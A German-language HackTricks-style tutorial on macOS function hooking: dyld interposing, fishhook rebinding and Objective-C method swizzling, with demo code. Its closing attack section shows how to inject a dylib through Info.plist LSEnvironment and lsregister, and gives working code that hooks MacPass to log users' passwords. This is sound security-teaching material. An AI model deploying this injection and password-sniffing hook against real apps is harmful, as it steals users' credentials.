# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

Erstelle eine **dylib** mit einem **`__interpose` (`__DATA___interpose`)**-Abschnitt (oder einem Abschnitt mit dem Flag **`S_INTERPOSING`**), der Tupel aus **Funktionszeigern** enthält, die auf die **originale** und die **Ersatz**-Funktion verweisen.

Dann **injiziere** die dylib mit **`DYLD_INSERT_LIBRARIES`** (das Interposing muss vor dem Laden der Haupt-App stattfinden). Offensichtlich gelten hier auch die [**Restriktionen** für die Verwendung von **`DYLD_INSERT_LIBRARIES`**](macos-library-injection/index.html#check-restrictions).

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c" overflow="wrap
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
> [!WARNING]
> Die **`DYLD_PRINT_INTERPOSING`** env variable kann verwendet werden, um interposing zu debuggen, und wird den interpose process ausgeben.

Beachte auch, dass **interposing zwischen dem process und den geladenen libraries stattfindet**, es funktioniert nicht mit dem shared library cache.

### Dynamic Interposing

Jetzt ist es auch möglich, eine Funktion dynamisch mit der Funktion **`dyld_dynamic_interpose`** zu interposen. Dies ermöglicht es, **programmatically** eine Funktion zur **runtime** zu interposen, statt dies nur von **Anfang** an zu tun.

Es müssen nur die **tuples** der **zu ersetzenden Funktion und der Ersatzfunktion** angegeben werden.
```c
struct dyld_interpose_tuple {
const void* replacement;
const void* replacee;
};
extern void dyld_dynamic_interpose(const struct mach_header* mh,
const struct dyld_interpose_tuple array[], size_t count);
```
### Import Table Rebinding (fishhook-style)

Wenn du bereits Codeausführung **innerhalb des Prozesses** hast und eine **imported C function** hooken willst, ohne das Target neu zu starten, ist ein sehr häufiges Primitive **symbol rebinding** (popularisiert durch **`fishhook`**).

Statt den **`__interpose`**-Abschnitt zu verwenden, durchläuft diese Technik die Mach-O-Metadaten (`__LINKEDIT` -> indirect symbol table -> `__la_symbol_ptr` / `__nl_symbol_ptr`) und **überschreibt den Import-Slot**, der vom aktuellen Image verwendet wird. Das ist sehr nützlich, um Funktionen in einem **bereits laufenden** Prozess zu hooken oder mit **`rebind_symbols_image`** **nur ein einziges Image** zu hooken.

> [!TIP]
> Dies betrifft nur Aufrufe, die tatsächlich über einen **import pointer** gehen. Wenn die Target function **direkt innerhalb desselben Images aufgerufen** wird, gibt es keinen importierten Slot zum Überschreiben, also sieht diese Technik diesen Call-Site nicht.
```c
// clang -dynamiclib fishhook_demo.c fishhook.c -o fishhook_demo.dylib
#include <stdio.h>
#include <unistd.h>
#include "fishhook.h"

static int (*real_close)(int);

int hooked_close(int fd) {
fprintf(stderr, "[+] close(%d)\n", fd);
return real_close(fd);
}

__attribute__((constructor))
static void install(void) {
struct rebinding rb = {"close", hooked_close, (void *)&real_close};
rebind_symbols(&rb, 1);
}
```

```bash
DYLD_INSERT_LIBRARIES=./fishhook_demo.dylib ./hello
```
Auf neueren macOS-Versionen befinden sich viele rebinding targets nicht mehr in beschreibbaren **`__DATA`**-Seiten. Rebinders müssen normalerweise **`__DATA_CONST`** vor dem Patchen des Pointers vorübergehend beschreibbar machen. Außerdem solltest du auf Apple Silicon / **`arm64e`** authentifizierte Pointer und zusätzliche Indirektion in **`__AUTH_CONST.__auth_got`** erwarten, sodass ein rebinder, der nur die klassischen lazy/non-lazy symbol pointer sections scannt, einige call sites übersehen kann.

> [!CAUTION]
> Die **`arm64e`** ABI verwendet **Pointer Authentication (PAC)** für viele function pointers. Blind pointer writes, die auf Intel früher funktioniert haben, können auf Apple Silicon eine call site brechen. Wenn du deinen eigenen rebinder oder inline hooker schreibst, sei bereit, **`<ptrauth.h>`**-Hilfsfunktionen wie **`ptrauth_sign_unauthenticated`** oder **`ptrauth_auth_and_resign`** zu verwenden, und teste speziell auf **`arm64e`**-Zielen.

Für weitere Details zu **`__AUTH`**, **`__AUTH_CONST`** und **`__auth_got`**, siehe [diese Seite](../macos-apps-inspecting-debugging-and-fuzzing/objects-in-memory.md).

## Method Swizzling

In ObjectiveC wird eine method so aufgerufen: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Dazu werden das **object**, die **method** und die **params** benötigt. Und wenn eine method aufgerufen wird, wird ein **msg gesendet** unter Verwendung der Funktion **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Das object ist **`someObject`**, die method ist **`@selector(method1p1:p2:)`** und die arguments sind **value1**, **value2**.

Wenn man den object structures folgt, ist es möglich, zu einem **array of methods** zu gelangen, in dem die **names** und **pointers** zum method code **located** sind.

> [!CAUTION]
> Beachte, dass diese information aufgrund des Zugriffs auf methods und classes über ihre names im binary gespeichert ist, sodass sie mit `otool -ov </path/bin>` oder [`class-dump </path/bin>`](https://github.com/nygard/class-dump) ausgelesen werden kann

### Accessing the raw methods

Es ist möglich, auf die Informationen der methods wie name, number of params oder address zuzugreifen, wie im folgenden Beispiel:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Method Swizzling with method_exchangeImplementations

Die Funktion **`method_exchangeImplementations`** erlaubt es, die **Adresse** der **Implementierung** von **einer Funktion gegen die andere** zu **ändern**.

> [!CAUTION]
> Wenn also eine Funktion aufgerufen wird, dann wird **die andere ausgeführt**.
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really called

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> In diesem Fall könnte, wenn der **implementation code of the legit** method den **method**-**name** **verifies**, dies dieses swizzling **detecten** und verhindern, dass es ausgeführt wird.
>
> Die folgende Technik hat diese Einschränkung nicht.

### Method Swizzling with method_setImplementation

Das vorherige Format ist seltsam, weil du die implementation von 2 methods jeweils gegeneinander austauschst. Mit der Funktion **`method_setImplementation`** kannst du die **implementation** einer **method für die andere** **change**n.

Denk nur daran, die **address** der implementation der ursprünglichen zu **store**n, wenn du sie von der neuen implementation aus aufrufen willst, bevor du sie überschreibst, weil es später viel **complicated**er sein wird, diese address zu **locate**n.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Auf dieser Seite wurden verschiedene Wege diskutiert, functions zu hooken. Dabei ging es jedoch darum, **Code innerhalb des Prozesses auszuführen, um anzugreifen**.

Um das zu tun, ist die einfachste Technik, [Dyld via environment variables or hijacking](macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md) zu injizieren. Ich vermute jedoch, dass dies auch über [Dylib process injection](macos-ipc-inter-process-communication/index.html#dylib-process-injection-via-task-port) möglich wäre.

Allerdings sind beide Optionen **auf** **unprotected** Binaries/Prozesse **beschränkt**. Prüfe jede Technik, um mehr über die Einschränkungen zu erfahren.

Ein function hooking attack ist jedoch sehr spezifisch; ein Angreifer würde dies tun, um **sensible Informationen aus einem Prozess zu stehlen** (sonst würdest du einfach einen process injection attack durchführen). Und diese sensiblen Informationen könnten sich in vom Nutzer heruntergeladenen Apps wie MacPass befinden.

Der Angriffsvektor wäre also entweder, eine Schwachstelle zu finden oder die Signatur der Anwendung zu entfernen und die **`DYLD_INSERT_LIBRARIES`**-Umgebungsvariable über die Info.plist der Anwendung einzuschleusen, indem man etwas wie das Folgende hinzufügt:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
und dann die Anwendung **neu registrieren**:
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
Füge in dieser Library den Hooking-Code ein, um die Informationen zu exfiltrieren: Passwörter, Nachrichten...

> [!CAUTION]
> Beachte, dass in neueren Versionen von macOS, wenn du die Signatur des Application-Binaries **entfernst** und es zuvor ausgeführt wurde, macOS die Application **nicht mehr ausführen** wird.

#### Library example
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Referenzen

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
- [https://github.com/facebook/fishhook](https://github.com/facebook/fishhook)
- [https://clang.llvm.org/docs/PointerAuthentication.html](https://clang.llvm.org/docs/PointerAuthentication.html)

{{#include ../../../banners/hacktricks-training.md}}
